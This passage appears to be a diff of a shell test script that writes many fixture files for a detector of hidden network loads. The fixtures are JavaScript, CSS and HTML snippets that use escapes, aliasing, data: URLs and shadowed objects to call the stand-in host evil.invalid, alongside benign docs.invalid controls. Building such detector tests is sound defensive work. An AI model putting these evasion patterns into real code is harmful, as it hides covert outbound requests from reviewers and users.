+printf 'document.head.appendChild(document.createElement("script"))["src"]="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fappend-child-src%%22)"\n' \
+  > "$T/r9appendchildscriptsrc/a.js"
+printf 'const s=document.createElement("script");s.type="module";(s).removeAttribute("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-removal%%22)"\n' \
+  > "$T/r9parentremoval/a.js"
+printf 'const s=document.createElement("script");s.type="module";s?.removeAttribute("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Foptional-receiver-remove%%22)"\n' \
+  > "$T/r9optionalreceiverremove/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.removeAttribute?.("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Foptional-call-remove%%22)"\n' \
+  > "$T/r9optionalcallremove/a.js"
+printf 'const s=document.createElement("script");s.setAttributeNS(null,"TYPE","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fnamespace-uppercase%%22)"\n' \
+  > "$T/r9namespaceuppercase/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.removeAttributeNS(null,"TYPE");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fnamespace-uppercase-remove%%22)"\n' \
+  > "$T/r9namespaceremoveuppercase/a.js"
+printf 'const s=document.createElement("script");s.TYPE="module";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fuppercase-property%%22)"\n' \
+  > "$T/r9uppercaseproperty/a.js"
+printf 'const s=document.createElement("script");s["TYPE"]="module";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fuppercase-bracket-property%%22)"\n' \
+  > "$T/r9uppercasebracketproperty/a.js"
+printf 'const s=document.createElement("script");s.SETATTRIBUTE("type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fuppercase-setter-method%%22)"\n' \
+  > "$T/r9uppercasesettermethod/a.js"
+printf 'const s=document.createElement("script");s["SETATTRIBUTE"]("type","module");s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fuppercase-bracket-setter%%22)"\n' \
+  > "$T/r9uppercasebracketsetter/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.REMOVEATTRIBUTE("type");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fuppercase-remover-control%%22)"\n' \
+  > "$T/r9uppercaseremovercontrol/a.js"
+printf '(((fetch)))("%sevil.invalid/nested-paren-fetch")\n' "$_pr" \
+  > "$T/r9nestedparenfetch/a.js"
+printf '(location)?.assign?.("%sevil.invalid/paren-location")\n' "$_pr" \
+  > "$T/r9parenlocationassign/a.js"
+printf '(window)?.open?.("%sevil.invalid/paren-open")\n' "$_pr" \
+  > "$T/r9parenwindowopen/a.js"
+printf '(serviceWorker)?.register?.("%sevil.invalid/paren-service")\n' "$_pr" \
+  > "$T/r9parenserviceregister/a.js"
+printf '(xhr.open)("GET","%sevil.invalid/paren-xhr")\n' "$_pr" \
+  > "$T/r9parenxhropen/a.js"
+printf '(location)["href"]="%sevil.invalid/paren-location-bracket"\n' "$_pr" \
+  > "$T/r9parenlocationbracket/a.js"
+printf '(window).location="%sevil.invalid/paren-global-location"\n' "$_pr" \
+  > "$T/r9parenglobaldotlocation/a.js"
+printf '(document.head.appendChild(document.createElement("script")))["src"]="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fparen-append-child-src%%22)"\n' \
+  > "$T/r9parenappendchildsrc/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-uppercase-key%%22)",{TYPE:"module"})\n' \
+  > "$T/r9workeruppercasekey/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-uppercase-value%%22)",{type:"MODULE"})\n' \
+  > "$T/r9workeruppercasevalue/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fworker-padded-value%%22)",{type:" module "})\n' \
+  > "$T/r9workerpaddedvalue/a.js"
+printf 'fetch((("%sevil.invalid/grouped-fetch-argument")))\n' "$_pr" \
+  > "$T/r9groupedfetcharg/a.js"
+printf 'this[(("importScripts"))]("data:,0",("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fgrouped-import-key%%22)"))\n' \
+  > "$T/r9groupedimportkey/a.js"
+printf 'location[(("href"))]=(("%sevil.invalid/grouped-location-key"))\n' "$_pr" \
+  > "$T/r9groupedlocationkey/a.js"
+printf 'const s=document.createElement("script");s[(("src"))]=(("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fgrouped-script-key%%22)"))\n' \
+  > "$T/r9groupedscriptsrckey/a.js"
+printf 'const s=document.createElement("script");s.src=(("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fgrouped-src-value%%22)"))\n' \
+  > "$T/r9groupedsrcvalue/a.js"
+printf 'const s=document.createElement("script");s[(("setAttribute"))]((("src")),(("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fgrouped-setter%%22)")))\n' \
+  > "$T/r9groupedsetterargs/a.js"
+printf 'const note=(("%sdocs.invalid/grouped-inert-string"))\n' "$_pr" \
+  > "$T/r9groupedstringcontrol/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fgrouped-worker-module%%22)",{type:(("module"))})\n' \
+  > "$T/r9groupedworkermodule/a.js"
+printf 'const s=document.createElement("script");s.type=(("module"));s.src=(("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fgrouped-type-module%%22)"))\n' \
+  > "$T/r9groupedtypemodule/a.js"
+printf 'const s=document.createElement("script");s[(("setAttribute"))]((("type")),(("module")));s[(("src"))]=(("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fgrouped-set-type-module%%22)"))\n' \
+  > "$T/r9groupedsettypemodule/a.js"
+printf '@import url("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Fquoted-import%%22%%29");\n' \
+  > "$T/r9cssimporturldata/a.css"
+printf '@import url(data:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Funquoted-import%%22%%29);\n' \
+  > "$T/r9cssimporturlunquoted/a.css"
+printf 'body{background:url("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fordinary-background%%22%%29")}\n' \
+  > "$T/r9cssbackgrounddatacontrol/a.css"
+printf '<link rel="stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Fstylesheet%%22%%29">\n' \
+  > "$T/r9linkstylesheetdata/i.html"
+printf '<link rel="alternate stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Falternate-stylesheet%%22%%29">\n' \
+  > "$T/r9linkalternatestylesheetdata/i.html"
+printf '<link rel="icon" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Ficon-payload%%22%%29">\n' \
+  > "$T/r9linkicondata/i.html"
+printf '<link rel="preload" as="style" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fpreload-payload%%22%%29">\n' \
+  > "$T/r9linkpreloaddata/i.html"
+printf '<link rel="icon" href="%sevil.invalid/direct-icon">\n' "$_pr" \
+  > "$T/r9linkiconremote/i.html"
+printf 'node.setAttributeNS(\n  "http://www.w3.org/1999/xlink",\n  "xlink:href",\n  "%sevil.invalid/xlink-dot"\n)\n' "$_pr" \
+  > "$T/r9xlinkdot/a.js"
+printf 'node[(("setAttributeNS"))](\n  "http://www.w3.org/1999/xlink",\n  "href",\n  "%sevil.invalid/xlink-bracket"\n)\n' "$_pr" \
+  > "$T/r9xlinkbracket/a.js"
+printf 'node.setAttributeNS("urn:test","href","%sdocs.invalid/non-fetching-namespace")\n' "$_pr" \
+  > "$T/r9xlinkothernscontrol/a.js"
+printf 'const img=document.createElement("img");img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fdocs.invalid%%2Fknown-image%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9dynamicimghtmlcontrol/a.js"
+printf 'const img=document.createElement("img");img[(("src"))]="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fdocs.invalid%%2Fknown-image-bracket%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9dynamicimgbracketcontrol/a.js"
+printf 'const img=document.createElement("img");img.setAttribute("src","data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fdocs.invalid%%2Fknown-image-setter%%22)%%3C%%2Fscript%%3E")\n' \
+  > "$T/r9dynamicimgsettercontrol/a.js"
+printf 'const img=document.createElement("img");img.src="%sevil.invalid/known-image-remote"\n' "$_pr" \
+  > "$T/r9dynamicimgremote/a.js"
+printf 'unknown.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Funknown-source%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9unknownsrchtml/a.js"
+printf 'const frame=document.createElement("iframe");frame.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fknown-frame%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9dynamiciframehtml/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fgrouped-options%%22)",(({type:"module"})))\n' \
+  > "$T/r9workeroptionsgrouped/a.js"
+printf 'new Worker("data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fcomma-options%%22)",({type:"module"},{}))\n' \
+  > "$T/r9workeroptionscomma/a.js"
+printf 'const s=document.createElement("script")\ns.type="module"\ns.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fasi-module%%22)"\n' \
+  > "$T/r9asimodule/a.js"
+printf 'const s=document.createElement("script")\nif(false)\ns.type="module"\ns.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fasi-conditional%%22)"\n' \
+  > "$T/r9asiconditional/a.js"
+printf '<script type="importmap">{"imports":{"//docs.invalid/key":"./vendor.js"}}</script>\n' \
+  > "$T/r9importmapkeycontrol/i.html"
+printf '<script type="importmap">{"scopes":{"//docs.invalid/scope/":{"pkg":"./vendor.js"}}}</script>\n' \
+  > "$T/r9importmapscopekeycontrol/i.html"
+printf '%s\n' '@import u\72l("data:text/css,%40import%20url%28%22%2F%2Fevil.invalid%2Fescaped-url%22%29");' \
+  > "$T/r9cssescapedurl/a.css"
+printf '%s\n' '@\69mport url("data:text/css,%40import%20url%28%22%2F%2Fevil.invalid%2Fescaped-import%22%29");' \
+  > "$T/r9cssescapedimport/a.css"
+printf '%s\n' '@import url("d\61 ta:text/css,%40import%20url%28%22%2F%2Fevil.invalid%2Fescaped-data%22%29");' \
+  > "$T/r9cssescapeddatascheme/a.css"
+printf '%s\n' '.note::before{content:"d\61 ta:text/css,%40import%20url%28%22%2F%2Fdocs.invalid%2Finert%22%29"}' \
+  > "$T/r9cssescapedstringcontrol/a.css"
+printf '<link rel="icon&#11;stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fvt-token%%22%%29">\n' \
+  > "$T/r9relvtcontrol/i.html"
+printf '<link rel="icon&#160;stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fnbsp-token%%22%%29">\n' \
+  > "$T/r9relnbspcontrol/i.html"
+printf '<link rel="icon&emsp;stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Femsp-token%%22%%29">\n' \
+  > "$T/r9relemspcontrol/i.html"
+printf '<link rel="icon&#9;stylesheet" href="data:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Ftab-token%%22%%29">\n' \
+  > "$T/r9reltabstylesheet/i.html"
+printf 'const s=document.createElement("script");s.type="module" && "";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdirect-type-expression%%22)"\n' \
+  > "$T/r9directtypeexpression/a.js"
+printf 'const s=document.createElement("script");s[(("type"))]=(("module")) && "";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fbracket-type-expression%%22)"\n' \
+  > "$T/r9brackettypeexpression/a.js"
+printf 'const s=document.createElement("script");s.type="module"\n&& ""\ns.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fnewline-type-expression%%22)"\n' \
+  > "$T/r9newlinetypeexpression/a.js"
+printf 'const s=document.createElement("script")\rs.type="module"\rs.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fasi-cr-module%%22)"\r' \
+  > "$T/r9asicrmodule/a.js"
+printf 'const s=document.createElement("script")\rif(false)\rs.type="module"\rs.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fasi-cr-conditional%%22)"\r' \
+  > "$T/r9asicrconditional/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");{const img=frame;img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fimage-shadow%%22)%%3C%%2Fscript%%3E"}\n' \
+  > "$T/r9imageshadow/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");(function(img){img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fimage-param-shadow%%22)%%3C%%2Fscript%%3E"})(frame)\n' \
+  > "$T/r9imageparametershadow/a.js"
+printf 'node.setAttributeNS(ns,"foo:href","%sevil.invalid/unknown-xlink-namespace")\n' "$_pr" \
+  > "$T/r9unknownxlinknamespace/a.js"
+printf '%s' "@import url(\"da\\" > "$T/r9cssescapedlinecontinuation/a.css"
+printf '\nta:text/css,%%40import%%20url%%28%%22%%2F%%2Fevil.invalid%%2Fescaped-line%%22%%29");\n' \
+  >> "$T/r9cssescapedlinecontinuation/a.css"
+printf 'const s=document.createElement("script");s.type="mod"+"ule";s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Ftype-concat%%22)"\n' \
+  > "$T/r9directtypeconcat/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");((img)=>img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fimage-arrow-shadow%%22)%%3C%%2Fscript%%3E")(frame)\n' \
+  > "$T/r9imagearrowshadow/a.js"
+printf 'node[(("setAttributeNS"))](ns,"foo:href","%sevil.invalid/unknown-xlink-bracket")\n' "$_pr" \
+  > "$T/r9unknownxlinkbracket/a.js"
+printf '%s\n' '@import url(d\61 ta:text/css,%40import%20url%28%22%2F%2Fevil.invalid%2Funquoted-escaped-data%22%29);' \
+  > "$T/r9cssunquotedescapeddata/a.css"
+printf '%s\n' 'body{background:url(\2f\2f evil.invalid/unquoted-escaped-remote)}' \
+  > "$T/r9cssunquotedescapedremote/a.css"
+printf '%s' "@im\\" > "$T/r9cssinvalidescapedimportcontrol/a.css"
+printf '\nport url("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Finvalid-import%%22%%29");\n' \
+  >> "$T/r9cssinvalidescapedimportcontrol/a.css"
+printf '%s' "@import u\\" > "$T/r9cssinvalidescapedurlcontrol/a.css"
+printf '\nrl("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Finvalid-url%%22%%29");\n' \
+  >> "$T/r9cssinvalidescapedurlcontrol/a.css"
+printf 'a{content:"unterminated\n;background:url(%sevil.invalid/bad-string-recovery)}\n' "$_pr" \
+  > "$T/r9cssbadstringrecovery/a.css"
+printf 'const img=document.createElement("img")&&document.createElement("iframe");img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fimage-initializer%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9imageinitializerand/a.js"
+printf 'const s=document.createElement("script")&&document.createElement("iframe");s.type="application/json";s.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fscript-initializer%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9scriptinitializerand/a.js"
+printf 'const x=document.createElement("iframe")&&document.createElement("script");x.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fiframe-script-initializer%%22)"\n' \
+  > "$T/r9iframeinitializerscript/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");for(const [img] of [[frame]])img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Farray-destructure%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9imagearraydestructure/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");for(const {img} of [{img:frame}])img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fobject-destructure%%22)%%3C%%2Fscript%%3E"\n' \
+  > "$T/r9imageobjectdestructure/a.js"
+printf 'const img=document.createElement("img");const frame=document.createElement("iframe");((img=(null))=>img.src="data:text/html,%%3Cscript%%3Efetch(%%22%%2F%%2Fevil.invalid%%2Fnested-default-shadow%%22)%%3C%%2Fscript%%3E")(frame)\n' \
+  > "$T/r9imagenesteddefaultshadow/a.js"
+# shellcheck disable=SC2016  # `${...}` is literal JavaScript template syntax
+printf 'const s=document.createElement("script");s.type=`${[]}`;s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-direct-type%%22)"\n' \
+  > "$T/r9dynamicdirecttype/a.js"
+# shellcheck disable=SC2016  # `${...}` is literal JavaScript template syntax
+printf 'const s=document.createElement("script");s["type"]=`${[]}`;s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-bracket-type%%22)"\n' \
+  > "$T/r9dynamicbrackettype/a.js"
+# shellcheck disable=SC2016  # `${...}` is literal JavaScript template syntax
+printf 'const s=document.createElement("script");s.setAttribute("type",`${[]}`);s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-set-type%%22)"\n' \
+  > "$T/r9dynamicsettype/a.js"
+# shellcheck disable=SC2016  # `${...}` is literal JavaScript template syntax
+printf 'const s=document.createElement("script");s.type="module";s.setAttribute(`${"type"}`,`${[]}`);s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-set-name%%22)"\n' \
+  > "$T/r9dynamicsettypename/a.js"
+# shellcheck disable=SC2016  # `${...}` is literal JavaScript template syntax
+printf 'const s=document.createElement(`${["script"]}`);s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fdynamic-create-element%%22)"\n' \
+  > "$T/r9dynamiccreateelement/a.js"
+printf '%s' "@import url(da\\" > "$T/r9cssinvalidunquotedcontinuation/a.css"
+printf '\nta:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Finvalid-unquoted%%22%%29);\n' \
+  >> "$T/r9cssinvalidunquotedcontinuation/a.css"
+printf 'a{content:"bad\014;background:url(%sevil.invalid/bad-string-ff)}\n' "$_pr" \
+  > "$T/r9cssbadstringff/a.css"
+printf 'const s=document.createElement("script");s.type="module";const classic=document.createElement("script");{const s=classic;s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fscript-alias-shadow%%22)";document.head.append(s)}\n' \
+  > "$T/r9scriptaliasshadow/a.js"
+printf 'let x=document.createElement("iframe");x=document.createElement("script");x.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Flet-reassignment%%22)"\n' \
+  > "$T/r9letiframeintoscript/a.js"
+printf 'const x=document.createElement("iframe");const classic=document.createElement("script");{const x=classic;x.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fiframe-alias-script%%22)"}\n' \
+  > "$T/r9iframealiasscript/a.js"
+printf 'const x=document.createElement("iframe");const classic=document.createElement("script");((x)=>x.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fiframe-arrow-script%%22)")(classic)\n' \
+  > "$T/r9iframearrowaliasscript/a.js"
+printf 'const s=document.createElement("script");s.type="module";const frame=document.createElement("iframe");{const s=frame;s.src="data:text/html,%%3Cimg%%20src%%3D%%22%%2F%%2Fevil.invalid%%2Fscript-alias-iframe%%22%%3E"}\n' \
+  > "$T/r9scriptaliasiframe/a.js"
+printf 'const s=document.createElement("script");s.type="module";const frame=document.createElement("iframe");((s)=>s.src="data:text/html,%%3Cimg%%20src%%3D%%22%%2F%%2Fevil.invalid%%2Fscript-arrow-iframe%%22%%3E")(frame)\n' \
+  > "$T/r9scriptarrowaliasiframe/a.js"
+printf 'const s=document.createElement("script");s.type="module";void 0;s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fintervening-statement%%22)"\n' \
+  > "$T/r9scriptinterveningstatement/a.js"
+printf 'function mutate(t){t.removeAttribute("type");return "x"}const s=document.createElement("script");s.type="module";s.setAttribute("id",mutate(s));s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fpreserve-setter-side-effect%%22)"\n' \
+  > "$T/r9preservesettersideeffect/a.js"
+printf 'function mutate(t){t.removeAttribute("type");return "x"}const s=document.createElement("script");s.type="module";s.setAttributeNS("urn:test","id",mutate(s));s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fpreserve-ns-side-effect%%22)"\n' \
+  > "$T/r9preservenssideeffect/a.js"
+printf 'function mutate(t){t.removeAttribute("type");return "x"}const s=document.createElement("script");s.type="module";s.removeAttribute("id",mutate(s));s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fpreserve-remove-side-effect%%22)"\n' \
+  > "$T/r9preserveremovesideeffect/a.js"
+printf 'function mutate(t){t.removeAttribute("type");return "x"}const s=document.createElement("script");s.type="module";s.toggleAttribute("id",mutate(s));s.src="data:text/plain,fetch(%%22%%2F%%2Fevil.invalid%%2Fpreserve-toggle-side-effect%%22)"\n' \
+  > "$T/r9preservetogglesideeffect/a.js"
+printf 'const s=document.createElement("script");s.type="module";s.setAttribute("id","x");s.removeAttribute("title");s.src="data:text/plain,fetch(%%22%%2F%%2Fdocs.invalid%%2Fstatic-preserve-control%%22)"\n' \
+  > "$T/r9staticpreservecontrol/a.js"
+printf 'a{--junk://not-a-css-comment;background:url(%sevil.invalid/custom-slashes)}\n' "$_pr" \
+  > "$T/r9csscustomslashrecovery/a.css"
+printf 'a{--junk:<!--not-a-css-comment;background:url(%sevil.invalid/custom-html-open)}\n' "$_pr" \
+  > "$T/r9csscustomhtmlrecovery/a.css"
+# shellcheck disable=SC2016  # backtick is a literal CSS custom-property byte
+printf 'a{--junk:`;background:url(%sevil.invalid/custom-backtick)}\n' "$_pr" \
+  > "$T/r9csscustombacktickrecovery/a.css"
+printf '%s\n' '@import\20 url("data:text/css,%40import%20url%28%22%2F%2Fdocs.invalid%2Fescaped-space%22%29");' \
+  > "$T/r9cssescapedspaceimportcontrol/a.css"
+printf '%s\n' '@\69mport\20 url("data:text/css,%40import%20url%28%22%2F%2Fdocs.invalid%2Fescaped-keyword-space%22%29");' \
+  > "$T/r9cssescapedspacekeywordcontrol/a.css"
+printf 'a{--x:\\20url("%sdocs.invalid/escaped-leading-space")}\n' "$_pr" \
+  > "$T/r9cssescapedspacenamecontrol/a.css"
+printf 'a{--x:x\\20url("%sdocs.invalid/escaped-mid-space")}\n' "$_pr" \
+  > "$T/r9cssescapedspacemidnamecontrol/a.css"
+printf 'a{--x:\\a0url("%sdocs.invalid/escaped-nbsp")}\n' "$_pr" \
+  > "$T/r9cssescapednbspnamecontrol/a.css"
+printf 'a{--x:not-url("%sdocs.invalid/hyphen-url")}\n' "$_pr" \
+  > "$T/r9csshyphenurlcontrol/a.css"
+printf 'a{--x:not-image("%sdocs.invalid/hyphen-image")}\n' "$_pr" \
+  > "$T/r9csshyphenimagecontrol/a.css"
+printf 'a{--x:not-image-set("%sdocs.invalid/hyphen-image-set")}\n' "$_pr" \
+  > "$T/r9csshyphenimagesetcontrol/a.css"
+printf 'abstract class C {}\n/[a//]/.test(x); fetch("%sevil.invalid/abstract-class")\n' "$_pr" \
+  > "$T/r9regexabstractclass/a.ts"
+printf 'declare class C {}\n/[a//]/.test(x); fetch("%sevil.invalid/declare-class")\n' "$_pr" \
+  > "$T/r9regexdeclareclass/a.ts"
+printf 'const enum E {}\n/[a//]/.test(x); fetch("%sevil.invalid/const-enum")\n' "$_pr" \
+  > "$T/r9regexconstenum/a.ts"
+printf 'type X = {}\n/[a//]/.test(x); fetch("%sevil.invalid/type-alias")\n' "$_pr" \
+  > "$T/r9regextypealias/a.ts"
+printf '@sealed\nclass C {}\n/[a//]/.test(x); fetch("%sevil.invalid/decorated-class")\n' "$_pr" \
+  > "$T/r9regexdecoratedclass/a.ts"
+printf 'const real=window.document;const document={createElement(){return real.createElement("iframe")}};const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fshadowed-document-script%%22%%3E";real.body.append(s)\n' \
+  > "$T/r9shadoweddocumentscript/a.js"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={document:{createElement(){return frame}}};const s=fake.document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fsuffix-document-script%%22%%3E"</script>\n' \
+  > "$T/r9suffixdocumentscript/a.html"
+printf 'const real=window.document;const document={createElement(){return real.createElement("iframe")}};const img=document.createElement("img");img.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fshadowed-document-image%%22%%3E";real.body.append(img)\n' \
+  > "$T/r9shadoweddocumentimage/a.js"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;(function(document){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fparameter-document%%22%%3E"})({createElement(){return frame}})</script>\n' \
+  > "$T/r9parameterdocument/a.html"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const {document}={document:{createElement(){return frame}}};const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fdestructured-document%%22%%3E"</script>\n' \
+  > "$T/r9destructureddocument/a.html"
+printf 'interface I<T> {}\n/[a//]/.test(x); fetch("%sevil.invalid/interface-generic")\n' "$_pr" \
+  > "$T/r9regexinterfacegeneric/a.ts"
+printf 'interface I extends J {}\n/[a//]/.test(x); fetch("%sevil.invalid/interface-extends")\n' "$_pr" \
+  > "$T/r9regexinterfaceextends/a.ts"
+printf 'type X = {} & {}\n/[a//]/.test(x); fetch("%sevil.invalid/type-intersection")\n' "$_pr" \
+  > "$T/r9regextypeintersection/a.ts"
+printf 'type X<T = string> = {}\n/[a//]/.test(x); fetch("%sevil.invalid/type-generic-default")\n' "$_pr" \
+  > "$T/r9regextypegenericdefault/a.ts"
+printf 'declare module "pkg" {}\n/[a//]/.test(x); fetch("%sevil.invalid/declare-module")\n' "$_pr" \
+  > "$T/r9regexdeclaremodule/a.ts"
+printf '@sealed({x:1})\nclass C {}\n/[a//]/.test(x); fetch("%sevil.invalid/decorator-object")\n' "$_pr" \
+  > "$T/r9regexdecoratorobject/a.ts"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={createElement(){return frame}};for(const document of [fake]){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Floop-document%%22%%3E"}</script>\n' \
+  > "$T/r9loopdocument/a.html"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={createElement(){return frame}};const o={m(document){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fmethod-document%%22%%3E"}};o.m(fake)</script>\n' \
+  > "$T/r9methoddocument/a.html"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={createElement(){return frame}};(function({x:document}){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fdestructured-param-document%%22%%3E"})({x:fake})</script>\n' \
+  > "$T/r9destructuredparamdocument/a.html"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={createElement(){return frame}};const {x=0,y:document}={y:fake};const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fdefault-destructured-document%%22%%3E"</script>\n' \
+  > "$T/r9defaultdestructureddocument/a.html"
+printf '<iframe></iframe><script>const frame=frames[0].frameElement;const fake={createElement(){return frame}};function* f(document){const s=document.createElement("script");s.type="module";s.src="data:text/html,%%3Cimg%%20src=%%22%%2F%%2Fevil.invalid%%2Fgenerator-document%%22%%3E";yield 0}f(fake).next()</script>\n' \
+  > "$T/r9generatordocument/a.html"
+printf 'a{--x:@\\131mport url("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fdotless-import%%22%%29")}\n' \
+  > "$T/r9cssdotlessimportcontrol/a.css"
+printf 'a{--x:@\\130mport url("data:text/css,%%40import%%20url%%28%%22%%2F%%2Fdocs.invalid%%2Fdotted-import%%22%%29")}\n' \
+  > "$T/r9cssdottedimportcontrol/a.css"
+printf 'a{--x:\\131mage("%sdocs.invalid/dotless-image")}\n' "$_pr" \
+  > "$T/r9cssdotlessimagecontrol/a.css"
+printf 'a{background:url("http\\17f://docs.invalid/long-s-scheme")}\n' \
+  > "$T/r9csslongsschemecontrol/a.css"
+printf 'a{background:url("\\17f tun:docs.invalid/long-s-stun")}\n' \
